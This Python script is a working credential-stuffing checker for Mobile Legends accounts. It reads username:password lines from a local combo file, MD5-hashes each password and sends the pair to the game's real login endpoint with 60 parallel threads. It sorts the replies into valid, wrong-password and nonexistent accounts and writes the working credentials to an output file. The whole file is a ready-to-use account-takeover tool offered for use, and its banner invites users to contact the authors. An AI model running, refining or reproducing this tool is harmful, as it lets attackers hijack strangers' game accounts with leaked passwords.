import httpx
import hashlib
import json
import time
import concurrent.futures
import atexit
import sys
import re
import os
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.box import ROUNDED
from rich import print as rprint  # Import rich print for colored output
from rich.progress import Progress  # Import for progress animations
from time import sleep

# Initialize console for rich output
console = Console()

def hash_md5(text: str) -> str:
    """Returns the MD5 hash of the given text."""
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def list_txt_files():
    """
    Lists all .txt files in the current folder and allows the user to select one.
    """
    txt_files = [f for f in os.listdir() if f.endswith(".txt")]
    if not txt_files:
        rprint("[bold red]No .txt files found in the current folder![/bold red]")
        sys.exit(0)

    file_list = "\n".join([f"[cyan][{idx}][/cyan] {file}" for idx, file in enumerate(txt_files, start=1)])
    menu_panel = Panel(
        file_list,
        title="[bold white]𝙕𝙔𝘼𝘾𝙃𝙊𝙊 × 𝙎𝘼𝙉𝙅𝙄 ",
        style="bold white",
        box=ROUNDED,
    )
    console.print(menu_panel)

    while True:
        try:
            choice = console.input("[magenta]➤Please Select a file: [/magenta]")
            choice = int(choice)
            if 1 <= choice <= len(txt_files):
                return txt_files[choice - 1]
            else:
                rprint("[bold red][~]Invalid choice. Please select a valid number.[/bold red]")
        except ValueError:
            rprint("[bold red][~]Invalid input. Please enter a number.[/bold red]")

def exit_message():
    """Displays an exit message when the program ends."""
    rprint("\n[bold green][✓]Program Stop. Thank you for using the Mlbb Checker![/bold green]")

# Register the exit handler
atexit.register(exit_message)

def check_account(line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count, index, total_accounts):
    """Handles checking of a single account."""
    line = line.strip()

    if not line or not re.match(r"^[^:]+[:].+$", line):
        rprint(f"[bold yellow][~] - Invalid format: {line}[/bold yellow]")
        invalid_format_count[0] += 1
        return

    try:
        username, password = re.split("[:]", line, maxsplit=1)
    except ValueError:
        rprint(f"[bold yellow][~] [INVALID] - Invalid format: {line}[/bold yellow]")
        invalid_format_count[0] += 1
        return

    md5_password = hash_md5(password.strip())
    data = {
        'account': username.strip(),
        'md5pwd': md5_password,
        'module': 'mpass',
        'type': 'web',
        'app_id': '668'
    }

    response = httpx.post('https://sg-api.mobilelegends.com/base/login', data=data)

    try:
        res = response.json()
    except json.JSONDecodeError:
        rprint(f"[bold red][«»] [ERROR] - Response error for {username.strip()}[/bold red]")
        error_creds.append(f"{username.strip()}:{password.strip()} (Response error)")
        return

    msg = res.get('msg')

    if msg == "ok":
        successful_creds.append(f"{username.strip()}:{password.strip()}")
        rprint(f"[bold green][✓] [SUCCESS] - Valid: {username.strip()}[/bold green]")
        success_count[0] += 1
    elif msg == "Error_PasswdError":
        rprint(f"[bold red][~] - Incorrect password for {username.strip()}[/bold red]")
        incorrect_password_count[0] += 1
        error_creds.append(f"{username.strip()}:{password.strip()} (Incorrect password)")
    elif msg == "Error_NoAccount":
        rprint(f"[bold red][~] - Account does not exist for {username.strip()}[/bold red]")
        no_account_count[0] += 1
        error_creds.append(f"{username.strip()}:{password.strip()} (Account not found)")
    else:
        rprint (f"[bold red][~] - Unknown response for {username.strip()}[/bold red]")
        other_count[0] += 1
        error_creds.append(f"{username.strip()}:{password.strip()} (Unknown response)")

    if index % 60 == 0 or index == total_accounts:
        rprint(f"[bold blue]Checked {index}/{total_accounts} accounts[/bold blue]")

def main():
    rprint('[bold yellow]𝙉𝙤𝙩𝙚 𝙏𝙝𝙞𝙨 𝙏𝙤𝙤𝙡𝙨 𝙄𝙨 𝙢𝙖𝙙𝙚 𝘽𝙮 𝙕𝙮𝙖𝙘𝙝𝙤𝙤 × 𝙎𝙖𝙣𝙟𝙞 𝙄𝙛 𝙔𝙤𝙪 𝙬𝙖𝙣𝙩 𝙏𝙪𝙩 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙕𝙮𝙖𝙘𝙝𝙤𝙤 𝙤𝙧 𝙎𝙖𝙣𝙟𝙞[/bold yellow]')
    selected_file = list_txt_files()

    try:
        with open(selected_file, 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        rprint("[bold red]Error: Selected file not found![/bold red]")
        sys.exit(0)

    try:
        output_filename = input('Please Enter The name where you will save the result (or leave it a blank):')
        if not output_filename.strip():
            output_filename = 'validity-checked'
    except KeyboardInterrupt:
        rprint("\n[bold red]Operation cancelled by user. Exiting...[/bold red]")
        sys.exit(0)

    successful_file = f"{output_filename}.txt"
    error_file = f"{output_filename}-die.txt"
    total_accounts = len(lines)

    rprint(f"[bold green]Checking {total_accounts} accounts...[/bold green]")

    successful_creds = []
    error_creds = []
    success_count = [0]
    incorrect_password_count = [0]
    no_account_count = [0]
    other_count = [0]
    invalid_format_count = [0]

    # Using ThreadPoolExecutor for multithreading
    with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
        futures = []
        for index, line in enumerate(lines, start=1):
            futures.append(executor.submit(check_account, line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count, index, total_accounts))

        # Wait for all threads to finish
        concurrent.futures.wait(futures)

    if successful_creds:
        with open(successful_file, 'w') as output_file:
            output_file.write('\n'.join(successful_creds))
        rprint(f"\n[bold green]Results saved successfully to {successful_file}[/bold green]")
    else:
        rprint("\n[bold red]No successful logins found, nothing saved[/bold red]")

    if error_creds:
        with open(error_file, 'w') as error_output_file:
            error_output_file.write('\n'.join(error_creds))
        rprint(f"[bold green]Errors saved successfully to {error_file}[/bold green]")
    else:
        rprint("[bold red]No errors found, nothing saved to die file[/bold red]")

    rprint("\n[bold blue]Checking Done Result:[/bold blue]")
    rprint(f"[bold blue]Total Accounts Checked: {total_accounts}[/bold blue]")
    rprint(f"[bold green]Valid Accounts: {success_count[0]}[/bold green]")
    rprint(f"[bold red]Incorrect Passwords: {incorrect_password_count[0]}[/bold red]")
    rprint(f"[bold yellow]Invalid Formats: {invalid_format_count[0]}[/bold yellow]")
    rprint(f"[bold red]No Accounts: {no_account_count[0]}[/bold red]")
    rprint(f"[bold red]Errors: {other_count[0]}[/bold red]")

if __name__ == "__main__":
    main()